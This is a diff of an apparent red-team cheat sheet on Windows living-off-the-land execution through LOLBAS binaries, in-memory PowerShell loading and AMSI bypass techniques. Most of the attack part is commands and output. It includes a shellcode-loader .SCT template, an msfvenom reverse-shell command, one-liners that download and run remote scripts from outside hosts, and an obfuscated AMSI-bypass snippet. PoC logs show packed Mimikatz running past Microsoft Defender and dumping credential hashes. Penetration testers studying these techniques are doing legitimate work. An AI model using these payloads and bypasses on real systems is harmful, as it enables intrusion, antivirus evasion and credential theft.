+      Step 1. Generate a raw shellcode with your favorite C2 framework and start a reverse HTTPs listener
+      Step 2. Convert the format of the shellcode in C# (using for instance the tool "Supernova")
+      Step 3. Insert the C# shellcode in a C# shellcode loader template
+      Step 4. Use the tool "GadgetToJScript" to generate an obfuscated JavaScript file that embed your C# shellcode loader (.CS) in a .NET serialized 
+              gadget (that will load & execute the C# shellcode loader when deserialized using BinaryFormatter from the JS script)		
+      Step 5. Manually obfuscate the JavaScript file and insert it in a .SCT file
+      Step 6. Use "Mshta.exe" to execute on a Windows machine the malicious code contained in the .SCT file hosted on your remote Webserver
+      Step 7. Enjoy your C2 reverse shell 	  
+						
+      + Example of a .SCT file to execute Javascript code (JS generated with https://github.com/med0x2e/GadgetToJScript/tree/master) 
+        --------------------------------------------------------------------------------------------------------------------------
+	  
+			  <?XML version="1.0"?>
+			  <scriptlet>
+				<public>
+					<method name="Exec"></method>
+				</public>
+				<script language="JScript">
+				<![CDATA[
+					function Exec()
+					{
+						function Base64ToStream(b,l) {
+							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+							var length = enc.GetByteCount_2(b);
+							var ba = enc.GetBytes_4(b);
+							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+							ba = transform.TransformFinalBlock(ba, 0, length);
+							var ms = new ActiveXObject("System.IO.MemoryStream");
+							ms.Write(ba, 0, l);
+							ms.Position = 0;
+							return ms;
+						}
+						var stage_1 ="BLOB";
+						var stage_2 ="BLOB";
+						try {
+							var shell = new ActiveXObject('WScript.Shell');
+							ver = 'v4.0.30319';
+							try {
+								shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+							} catch(e) { 
+								ver = 'v2.0.50727';
+							}
+							shell.Environment('Process')('COMPLUS_Version') = ver;
+							var ms_1 = Base64ToStream(stage_1, 2341);
+							var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+							fmt_1.Deserialize_2(ms_1);
+						} catch (e) {
+							try{		
+								var ms_2 = Base64ToStream(stage_2, 117896);
+								var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+								fmt_2.Deserialize_2(ms_2);
+							}catch (e2){}
+						}
+					}
+				]]>
+				</script>
+			</scriptlet>
+
+
+➤ Executes HTA file from an external webserver
+
+  => mshta.exe http://webserver/payload.hta
+
+      + Example of a .HTA file  to execute VBScript 
+        --------------------------------------------
+
+				<html>
+				  <head>
+					<title>Hello World</title>
+				  </head>
+				  <body>
+					<h2>Hello World</h2>
+					<p>This is an HTA...</p>
+				  </body>
+
+				  <script language="VBScript">
+					Function Pwn()
+					  Set shell = CreateObject("wscript.Shell")
+					  shell.run "calc"
+					End Function
+
+					Pwn
+				  </script>
+				</html>
+
+     + Example using Msfvenom
+	   ------------------------
+	   $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta
+
+		
+---------------------------------------------------------------------------------------------------------------------------------------------------
+6.LOLBAS - Wscript.exe and Cscript.exe (Allow to download and execute remote Visual Basic scripts and JavaScript files)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths:
+   => C:\Windows\System32\wscript.exe
+   => C:\Windows\SysWOW64\wscript.exe
+   => C:\Windows\System32\cscript.exe
+   => C:\Windows\SysWOW64\cscript.exe
+
+
+➤ Use 'Wscript.exe' to execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.
+
+   => echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js 
+      && wscript.exe %temp%\test.txt:hi.js
+
+
+➤ Use 'Cscript.exe' to execute a Visual Basic script stored in an Alternate Data Stream (ADS).
+
+   => cscript //e:vbscript C:\Windows\Temp\file.ext:script.vbs
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+7. LOLBAS - Regsvr32.exe (Allow to proxy execution of remote malicious code)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths:
+   => C:\Windows\System32\regsvr32.exe
+   => C:\Windows\SysWOW64\regsvr32.exe
+
+
+➤ Executes the specified remote .SCT script with scrobj.dll.
+
+   => regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll
+
+   + Example of a ".SCT" file that executes "calc.exe":
+     --------------------------------------------------
   
-> The Windows Lockdown Policy (WLDP aka Device Guard) 
-  - It checks the digital signature of dynamic code.
+		<?XML version="1.0"?>
+		<scriptlet>
+		<registration 
+			progid="awl_bypass"
+			classid="{A1112221-0000-0000-0000-000DA00DACDC}" >
+				<script language="JScript">
+						<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
+			</script>
+		</registration>
+		</scriptlet>
 
 
-===================================================================================================================================================
-II.  Basic examples of 'Living off the land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
-===================================================================================================================================================
+---------------------------------------------------------------------------------------------------------------------------------------------------
+8. LOLBAS - Scriptrunner.exe (Execute script and exe files from a remote server)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths:
+   => C:\Windows\System32\scriptrunner.exe
+   => C:\Windows\SysWOW64\scriptrunner.exe
+
+
+➤ It allows to execute .CMD/.BAT script files and executables from a remote server
+
+   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\file.cmd
+   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\file.bat
+   => scriptrunner.exe -appvscript \\servername\C$\Windows\Temp\payload.exe
+
+   + Basic PoC n°1 with an obfuscated version of the audit/privesc script "WinPEAS" 
+     ------------------------------------------------------------------------------
+     C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\WinPeas.cmd
+	  Script filename is \\192.168.1.25\c$\temp\WinPeas.cmd
+	  Script arguments are
+	  Wait is False
+	  Timeout is -1
+	  Rollback is False
+
+	  Number of scripts to run: 1
+	  Script is \\192.168.1.25\c$\temp\WinPeas.cmd
+	  Wait is False
+	  RollbackOnError is False
+
+	=> A Windows box message pops-up and ask us to confirm the execution of the script. I clicked on the button "Run".
+
+	  "Open File - Security Warning
+	   We can't verify who created this file. Are you sure you want to run this file ?
+
+		Name: \\192.168.1.25\c$\temp\WinPeas.cmd
+
+	  Run button | Cancel button
+	  "
+
+	  /!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script
+	  ERROR: UNC paths (\\machine\share) are not supported.
+	  ERROR: UNC paths (\\machine\share) are not supported.
+	  ERROR: UNC paths (\\machine\share) are not supported.
+	  [i] Check for vulnerabilities for the OS version with the applied patches
+	  [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
+
+	  Host Name:                 Laptop02
+	  OS Name:                   Microsoft Windows 10 Professionnel
+	  OS Version:                10.0.19045 N/A Build 19045
+	  OS Manufacturer:           Microsoft Corporation
+	  OS Configuration:          Member Workstation
+	  <SNIP>
+
+	  ERROR: UNC paths (\\machine\share) are not supported.
+	  [i] You may need to adjust your local date/time to exploit some vulnerability
+	  Thu 08/14/2025
+	  03:19 AM
+		
+	  <SNIP>
+		
+	  Checking for defender whitelisted PATHS
+	  ERROR: UNC paths (\\machine\share) are not supported.
+	  PowerShell v2 Version:
+
+	  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine
+		PowerShellVersion    REG_SZ    2.0
+
+	  PowerShell v5 Version:
+
+	  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\3\PowerShellEngine
+		PowerShellVersion    REG_SZ    5.1.19041.1
+
+	  <SNIP>
+
+
+   + Basic PoC n°2 with a non-obfuscated version of "Mimikatz"
+     ---------------------------------------------------------
+      C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\mimikatz.exe
+	   Script filename is \\192.168.1.25\c$\temp\audit-mimiv2.exe
+	   Script arguments are
+	   Wait is False
+	   Timeout is -1
+	   Rollback is False
+
+	   Number of scripts to run: 1
+	   Script is \\192.168.1.25\c$\temp\audit-mimiv2.exe
+	   Wait is False
+	   RollbackOnError is False
+
+       Error: Operation did not complete successfully because the file contains a virus or potentially unwanted software
+
+
+   + Basic PoC n°3 with the binary "python.exe"
+     ------------------------------------------
+      C:\> scriptrunner.exe -appvscript \\192.168.1.25\c$\temp\python.exe
+	   Script filename is \\192.168.1.25\c$\temp\python.exe
+	   Script arguments are
+	   Wait is False
+	   Timeout is -1
+	   Rollback is False
+
+	   Number of scripts to run: 1
+	   Script is \\192.168.1.25\c$\temp\python.exe
+	   Wait is False
+	   RollbackOnError is False
+
+	=> A Windows box message pops-up and ask us to confirm the execution of the binary. I clicked on the button "Run".
+
+	   "
+	   Open File - Security Warning
+	   We can't verify who created this file. Are you sure you want to run this file ?
+
+		Name: \\192.168.1.25\c$\temp\python.exe
+
+	   Run button | Cancel button
+           "
+	
+	  \\192.168.1.25\c$\temp\python.exe
+	  Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
+	  >>>
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+9. LOLBAS - Ieexec.exe (Download and execute exe files from a remote server)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths:
+   => C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe
+   => C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ieexec.exe
+
+➤ The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. 
+  You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.
+  
+   => ieexec.exe https://www.example.org/file.exe
+
+Important note: the executable files are downloaded and stored in the folder "C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\"
+
+
+		
+================================================================================================================================================================
+III.  Basic examples of 'Living off the land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
+================================================================================================================================================================
 
 PowerShell is built on .NET and it natively allows to download and execute straight into memory:
-> PowerShell scripts
-> .Net Assemblies (PE and DLL)
-  Examples
-   > Method 1 - Add assembly with Add-Type cmdletPermalink
-   > Method 2 - Add assembly with Reflection Assembly
-   > Method 3 - Add assembly via a string objectPermalink
+➤ PowerShell scripts
+➤ .Net Assemblies (PE and DLL)
+   Examples
+    > Method 1 - Add assembly with Add-Type cmdletPermalink
+    > Method 2 - Add assembly with Reflection Assembly
+    > Method 3 - Add assembly via a string objectPermalink
 
-In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective 
-PE/DLL injection methods.
+In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective PE/DLL injection methods.
+
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------
 2.1. How to download and execute straight into memory a PowerShell script hosted remotely on a Web server
@@ -205,7 +842,6 @@ C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credential
 PoC with the tool "SharUP.exe" (C# - SharpUp.csproj)
 - - - - - - - - - - - - - - - - - - - - - - - - - - -
 PS C:\temp> $PEtoload = (New-Object System.Net.WebClient).DownloadData('http://192.168.13.154:8081/SharpUp.exe')
-
 PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($PEtoload);
 PS C:\temp> $entryPointMethod = $assembly.GetType('SharpUp.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
 PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('audit', '')));
@@ -248,192 +884,56 @@ PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
 PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 
 
-===================================================================================================================================================
-III. Basic examples of 'Living off the land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
-===================================================================================================================================================
 
-The goal of the 'LOLBAS' project is to document every binary, script, and library that can be used for 'Living Off The Land' techniques.
+================================================================================================================================================================
+IV.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
+================================================================================================================================================================
 
-=> https://lolbas-project.github.io/#
-=> https://github.com/LOLBAS-Project/LOLBAS#criteria
-=> http://malcommands.com/
+As a reminder, AMSI bypass techniques are needed only if we use scripting languages (Powershell, VBS, Javascript, VBA macros) and .NET managed code (C# assemblies)
+during our pentest/red team engagements. 
+Public bypass techniques mainly use memory patches or vectored exception handlers with e.g. hardware breakpoints to manipulate the scan or initialisation process at runtime. 
+Some others rely on manipulating the DLL load process - either when AMSI hasn't been initialised yet or for newly spawned processes.
+Most of the public AMSI bypasses are detected by antivirus/EDR solutions however they can get modified to get around signature based detections.
 
-
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Example of LOLBAS n°1 - Rundll32.exe (Allow to execute remote dll files)
----------------------------------------------------------------------------------------------------------------------------------------------------
-
-Use Rundll32.exe to execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute 
-(i.e. execute DLL from SMB share.)
-
-=> rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
-
-
-Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site 
-(i.e. execute code from Internet)
-
-=> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run
-                ("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Example of LOLBAS n°2 - Pcalua.exe (Program Compatibility Assistant - Allow to execute remote exe/dll files)
----------------------------------------------------------------------------------------------------------------------------------------------------
-
-Execute a target binary (.EXE) or DLL using the Program Compatibility Assistant. 
-A pop-up will appear and ask us to confirm the execution of the binary or DLL remotely hosted on a share. 
-
-=> C:\Windows\System32\pcalua.exe -a \\server\payload.dll
-=> C:\Windows\System32\pcalua.exe -a \\server\payload.exe
-
-Note: In general, the remote binary is executed in a new windows and exit as soon as the execution is finished.
-
-
-PoC with the hacking tool "Mimikatz" (obfuscated with the packer 'inceptor') on a Windows laptop protected by Windows Defender AV
----------------------------------------------------------------------------------------------------------------------------------
-
-PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
-            AntivirusSignatureLastUpdated | FL
-
-AntivirusEnabled              : True
-RealTimeProtectionEnabled     : True
-IoavProtectionEnabled         : True
-AntispywareEnabled            : True
-AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM
-
-
-PS C:\Temp> C:\Windows\system32\pcalua.exe -a "\\192.168.1.254\files\Packed-Mimi.exe"
-
-=> A Windows box message pops-up and ask us to confirm the execution of our malicious tool. I clicked on the button "Run".
- 
-"Open File - Security Warning
-We can't verify who created this file. Are yous sure you want to run this file ?
-
-Name: \\192.168.1.254\files\Packed-Mimi.exe
-Type: Application
-From: \\192.168.1.254\files\Packed-Mimi.exe
-
-Run button | Cancel button
-"
-
-=> Then a second Windows pops-up executing my packed/obfuscated version of Mimikatz: 
-
-[+] Success. amsi.dll Patched!
-[*] Restoring memory protection...
-
-  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
- .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
-
-mimikatz # coffee
-
-    ( (
-     ) )
-  .______.
-  |      |]
-  \      /
-   `----'
-
-mimikatz #
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Example of LOLBAS n°3 - Remote.exe (Debugging tool included with Windows Debugging Tools - Allow to execute remote exe files)
----------------------------------------------------------------------------------------------------------------------------------------------------
-
-It is Debugging tool included with Windows Debugging Tools that can be used to execute a remote binary without saving file to disk.
-
-=> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere
-
-PoC with the hacking tool "PassTheCert" on a Windows computer protected by Windows Defender AV
-----------------------------------------------------------------------------------------------
-
-C:\Temp>remote.exe /s "\\192.168.1.254\files\Pass-The-Cert.exe --help" anythinghere
-**************************************
-***********     REMOTE    ************
-***********     SERVER    ************
-**************************************
-To Connect: Remote /C PO744653 "anythinghere"
-
-PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] 
-                (--elevate|--rbcd|--add-computer|--set-spn|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]
-GENERAL OPTIONS:
-        --server DOMAIN_CONTROLLER
-                Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
-        --start-tls
-                Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
-        --cert-path CERT_PATH
-                Path to the certificate to authenticate with.
-        --cert-password CERT_PASSWORD
-                Password to the certificate (Optional argument. Default value: <empty>).
-<SNIP>
-
-Remote exiting. Child (\\192.168.1.254\Disque dur\Pass-The-Cert.exe --help) exit code was 0.
-
-C:\Temp>
-
-
-It can also be used to launch PowerShell...
-=> C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe /s "powershell.exe" anythinghere
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Example of LOLBAS n°4 - Regsvr32.exe (Allow to execute remote dll files)
----------------------------------------------------------------------------------------------------------------------------------------------------
-
-Execute the specified remote .SCT script with scrobj.dll.
-
-=> C:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll
-=> C:\Windows\SysWOW64\regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll
-
-
-Example of a ".SCT" file that executes "calc.exe":
---------------------------------------------------
-	<?XML version="1.0"?>
-	<scriptlet>
-	<registration 
-	    progid="awl_bypass"
-	    classid="{A1112221-0000-0000-0000-000DA00DACDC}" >
-	        <script language="JScript">
-	                <![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe");]]>
-		</script>
-	</registration>
-	</scriptlet>
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ Example of LOLBAS n°5 - Wscript.exe (Allow to execute remote scripts files)
----------------------------------------------------------------------------------------------------------------------------------------------------
-
-Execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.
-
-=> echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") 
-     > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
-
-
-
-===================================================================================================================================================
-IV.  AMSI bypass techniques to be able to load & execute straight in-memory offensive tools without being detected by Antivirus
-===================================================================================================================================================
-
-It exists many AMSI bypass techniques. Below are just a few classic examples.
-
----------------------------------------------------------------------------------------------------------------------------------------------------
+You will find below a few examples, tests and PoCs for common AMSI bypass techniques:
+--------------------------------------------------------------------------------------
 ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
----------------------------------------------------------------------------------------------------------------------------------------------------
+➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
+➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
+➤ AMSI bypass technique 4 - Using hardwarebreakpoint on "AmsiScanBuffer"
+➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
+➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
+➤ AMSI bypass technique 7 - AMSI dll hijacking
+➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 
+
+Usefull ressources:
+--------------------
+➤ https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html
+➤ https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+➤ https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+➤ https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-amsi-bypass/
+➤ https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
+➤ http://amsi.fail
+➤ ...
+
+
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
+***************************************************************************************************************************************************
 
 By forcing the AMSI initialization to fail (amsiInitFailed) no AMSI scan will be initiated for the current powershell process.
+However, keep in mind that this AMSI bypass technique works only for PowerShell scripts. It won't work to load C# assemblies like Rubeus and Certify. 
+Though, you can still run offensive tools developed with unmanaged code (e.g., C/C++) embeded in PowerShell scripts via reflected code loading in-memory.
+
+Note: This AMSI bypass method is not "OpSec safe".
 
 => https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 => https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
 => http://amsi.fail
 
---------------------------------------------------------------------
-PoC 1 - AMSI bypass test on a Windows Server 2022 (with Defender AV)
---------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+PoC 1 - AMSI bypass test on a Windows Server 2022 protected by the MS Defender antivirus
+----------------------------------------------------------------------------------------------
 
 ┌──(auditor㉿kali)-[~]
 └─$ evil-winrm -i 192.168.1.11 -u administrator -p <snip>
@@ -476,10 +976,9 @@ AntivirusSignatureLastUpdated : 5/2/2025 3:55:30 AM
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> [Runtime.InteropServices.Marshal]::WriteInt32([Ref].ASSeMBly.GEtTYPe(("{5}{2}{0}{1}{3}{6}{4}" 
-					          -f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" 
-						  -f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" 
-						  -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);
-
+					          						-f 'ut',('o'+'ma'+'t'+''+'ion.'),'.A',('Am'+''+'s'+'iU'+'t'+''),'ls',('S'+'yste'+'m.'+'M'+'anag'+'e'+'men'+'t'),'i')).GEtFieLd(("{2}{0}{1}" 
+						 							-f 'i',('Co'+'n'+'text'),('am'+'s')),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" 
+						  							-f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GEtVaLUe($0x00),0x41414141);
 
 => To verify that the AMSI has been successfully bypassed we can type the command "invoke-mimikatz" that should not been catched anymore by Microsoft Defender.
    Result : the command is not detected :-) 
@@ -524,9 +1023,9 @@ SID               : S-1-5-21-3336774573-1234467604-3718094125-500
          * DPAPI    : 62c9d420fbebe8aca4f082465<SNIP>
         tspkg :
 
--------------------------------------------------------------------
-PoC 2 - AMSI bypass test on a Windows 10 laptop (with Defender AV)
--------------------------------------------------------------------
+----------------------------------------------------------------------------------------------
+PoC 2 - AMSI bypass test on a Windows 10 laptop protected by the MS Defender antivirus
+----------------------------------------------------------------------------------------------
 
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -548,7 +1047,7 @@ SerializationVersion           1.1.0.1
 
 
 PS C:\Users\pentester> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
-		       AntivirusSignatureLastUpdated | FL
+		       			AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
@@ -598,22 +1097,20 @@ PS C:\Users\pentester> IEX (New-Object Net.WebClient).DownloadString('https://ra
 <SNIP>
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
-➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory 
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
+***************************************************************************************************************************************************
 
-There are multiple blogs and GitHub projects that share example of code to patch the AMSI.dll in memory.
+Patching the "Amsi.dll" in memory (AmsiScanBuffer) is an effective technique but more and more AV/EDR products are able to detect this technique 
+via memory scan.
 
-=> https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-=> https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
-=> http://amsi.fail
+--------------------------------------------------------------------------------------------------------------------------------
+PoC n°1 - Patching the "Amsi.dll" in memory (AmsiScanBuffer) on a Windows Server 2022 protected by the MS Defender antivirus
+          (Test as a local admin user logged with PowerShell remoting)
+--------------------------------------------------------------------------------------------------------------------------------
 
--------------------------------------------------------------------------------------------------------------------------
-PoC n°1 - Windows Server 2022 (with Defender AV) - Test as a local administrator user logged with PowerShell remoting
--------------------------------------------------------------------------------------------------------------------------
-
-To successfully patch the AMSI.dll in the PowerShell remoting session, I used a well known PowerShell script (containing C# code) that I obfuscated 
-and splitted in 3 parts before loading it from a remote Web server. 
+To successfully patch the AMSI.dll in the PowerShell remoting session, I used a well known PowerShell script (containing C# code) that I obfuscated and splitted 
+in 3 parts before loading it from a remote Web server. 
 Doing so allowed me to execute my malicious script that patch the AMSI.dll without being blocked by the Microsoft Defender AV running on the Windows computer. 
 
 
@@ -648,7 +1145,7 @@ SerializationVersion           1.1.0.1
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
-						  AntivirusSignatureLastUpdated | FL
+						  						  AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
@@ -664,7 +1161,7 @@ True
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 
-=> The AMSI.dll has been pacthed. We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.
+=> The AMSI.dll has been patched. We can now download and execute any malicious scripts and tools such as the hacking tool 'Mimikatz' for this PoC.
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/SuperMimiCustom.ps1');
 
@@ -698,9 +1195,10 @@ SID               : S-1-5-21-3336774573-1234467604-3718094125-500
 <SNIP>
 
 
-----------------------------------------------------------------------------------------------------------------------------
-PoC n°2 - Windows 10 laptop (with Microsoft Defender AV) - Test as a local administrator user but without an elevated shell
-----------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------
+PoC n°2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer) on a Windows 10 laptop protected by the MS Defender antivirus
+          (Test as a local administrator user but without an elevated shell)
+------------------------------------------------------------------------------------------------------------------------------
 
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -722,7 +1220,7 @@ SerializationVersion           1.1.0.1
 
 
 PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled, 
-			   AntivirusSignatureLastUpdated | FL
+			   			   AntivirusSignatureLastUpdated | FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
@@ -797,78 +1295,136 @@ Command: help
 
 <SNIP>
 
-----------------------------------------------------------------------------------------------------------------------------
-PoC n°3 - Windows 10 laptop (with Microsoft Defender AV) - Test as a local administrator user but without an elevated shell
-----------------------------------------------------------------------------------------------------------------------------
 
-I used the tool "Sharp-Killer".
-=> Lifetime AMSI bypass by @ZeroMemoryEx ported to .NET Framework 4.8 
-=> https://github.com/S1lkys/SharpKiller
+***************************************************************************************************************************************************
+➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
+***************************************************************************************************************************************************
 
-Step 1 - I obfuscated the tool "Sharp-Killer" with the packer "Confuser-EX"
-<snip>
-[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
-[DEBUG] Executing 'Anti-debug injection' phase...
-[DEBUG] Executing 'Anti-dump injection' phase...
-[DEBUG] Executing 'Anti-ILDasm marking' phase...
-[DEBUG] Executing 'Encoding reference proxies' phase...
-[DEBUG] Executing 'Constant encryption helpers injection' phase...
-[DEBUG] Executing 'Resource encryption helpers injection' phase...
-[DEBUG] Executing 'Type scrambler' phase...
-[DEBUG] Executing 'Constants encoding' phase...
-[DEBUG] Executing 'Hardening Phase' phase...
-[DEBUG] Executing 'Anti-tamper helpers injection' phase...
-[DEBUG] Executing 'Control flow mangling' phase...
-[DEBUG] Executing 'Post-renaming' phase...
-[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
-[DEBUG] Executing 'Apply watermark' phase...
-[DEBUG] Executing 'Anti-tamper module writer preparation' phase...
-[DEBUG] Executing 'Anti-debug injection' phase...
-[DEBUG] Executing 'Anti-dump injection' phase...
-[DEBUG] Executing 'Anti-ILDasm marking' phase...
-[DEBUG] Executing 'Encoding reference proxies' phase...
-[DEBUG] Executing 'Constant encryption helpers injection' phase...
-[DEBUG] Executing 'Resource encryption helpers injection' phase...
-[DEBUG] Executing 'Type scrambler' phase...
-[DEBUG] Executing 'Constants encoding' phase...
-[DEBUG] Executing 'Hardening Phase' phase...
-[DEBUG] Executing 'Anti-tamper helpers injection' phase...
-[DEBUG] Executing 'Control flow mangling' phase...
-[DEBUG] Executing 'Post-renaming' phase...
-[DEBUG] Executing 'Anti-tamper metadata preparation' phase...
-[DEBUG] Executing 'Apply watermark' phase...
-<SNIP>
+AmsiOpenSession is a lesser-known function within AMSI that plays a crucial role in scanning scripts and executables. 
